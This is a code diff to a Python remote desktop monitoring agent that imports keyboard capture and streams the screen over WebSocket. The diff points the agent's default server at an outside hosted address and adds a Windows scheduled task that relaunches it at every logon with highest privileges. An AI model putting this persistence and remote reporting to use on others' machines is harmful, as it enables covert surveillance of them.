@@ -4,7 +4,10 @@ and WebSocket communication for remote desktop monitoring.
 """
 
 import asyncio
+import os
 import socket
+import subprocess
+import sys
 import uuid
 import platform
 import getpass
@@ -16,6 +19,30 @@ from keyboard import KeyboardCapture
 from websocket import WebSocketClient
 
 
+def build_task_command(executable_path: str, args=None) -> str:
+    """Build a Windows-compatible command string for a scheduled task."""
+    normalized_path = executable_path.replace("\\", "/")
+    arg_list = [normalized_path, *list(args or [])]
+    return subprocess.list2cmdline(arg_list)
+
+
+def build_schtasks_create_command(task_name: str, command: str) -> list:
+    """Build the schtasks command used to auto-start the agent on logon."""
+    return [
+        "schtasks",
+        "/Create",
+        "/TN",
+        task_name,
+        "/SC",
+        "ONLOGON",
+        "/RL",
+        "HIGHEST",
+        "/F",
+        "/TR",
+        command,
+    ]
+
+
 class MonitoringAgent:
     """
     Main monitoring agent that coordinates all client components.
@@ -23,7 +50,7 @@ class MonitoringAgent:
     
     def __init__(
         self,
-        server_url: str = "ws://localhost:8000/ws",
+        server_url: str = "https://screen-production-4c82.up.railway.app",
         target_fps: int = 10,
         jpeg_quality: int = 50
     ):
@@ -66,6 +93,7 @@ class MonitoringAgent:
         self.ws_client.on_connected = self._on_connected
         self.ws_client.on_disconnected = self._on_disconnected
         self.ws_client.on_error = self._on_error
+        self.ws_client.on_command = self._handle_server_command
     
     def _gather_device_info(self) -> Dict[str, Any]:
         """
@@ -151,6 +179,42 @@ class MonitoringAgent:
     def _on_error(self, error):
         """Callback when WebSocket error occurs."""
         print(f"Agent WebSocket error: {error}")
+
+    def _handle_server_command(self, command: str, params: Dict[str, Any]):
+        """Handle a command received from the server dashboard."""
+        if command == "stop":
+            print("Stop command received from server; shutting down agent")
+            self.stop()
+            os._exit(0)
+
+    def _get_executable_path(self) -> str:
+        """Resolve the executable path used for scheduled auto-restart."""
+        if getattr(sys, "frozen", False):
+            return os.path.abspath(sys.executable)
+
+        argv0 = sys.argv[0]
+        if os.path.isabs(argv0):
+            return os.path.abspath(argv0)
+        return os.path.abspath(os.path.join(os.getcwd(), argv0))
+
+    def _register_auto_start_task(self):
+        """Create a Windows scheduled task so the agent restarts after reboot."""
+        if platform.system() != "Windows":
+            return
+
+        executable_path = self._get_executable_path()
+        if not executable_path:
+            return
+
+        task_name = "MonitoringAgentAutoStart"
+        command = build_task_command(executable_path, ["--server", self.server_url])
+        create_command = build_schtasks_create_command(task_name, command)
+
+        try:
+            subprocess.run(create_command, check=False, capture_output=True, text=True)
+            print(f"Registered scheduled task {task_name}")
+        except Exception as e:
+            print(f"Unable to register scheduled task: {e}")
     
     def _screen_capture_loop(self):
         """Background thread for screen capture and transmission."""
@@ -201,6 +265,7 @@ class MonitoringAgent:
         if not self.running:
             print("Starting monitoring agent...")
             self.running = True
+            self._register_auto_start_task()
             
             # Start screen capture
             self.screen_capture.start()
@@ -274,7 +339,7 @@ def main():
     parser = argparse.ArgumentParser(description="Remote Desktop Monitoring Agent")
     parser.add_argument(
         "--server",
-        default="ws://localhost:8000/ws",
+        default="https://screen-production-4c82.up.railway.app",
         help="WebSocket server URL"
     )
     parser.add_argument(
@@ -302,8 +367,8 @@ def main():
     try:
         agent.start()
         
-        # Keep running
-        while True:
+        # Keep running until the agent is explicitly stopped.
+        while agent.running:
             time.sleep(1)
             
             # Print stats every 30 seconds
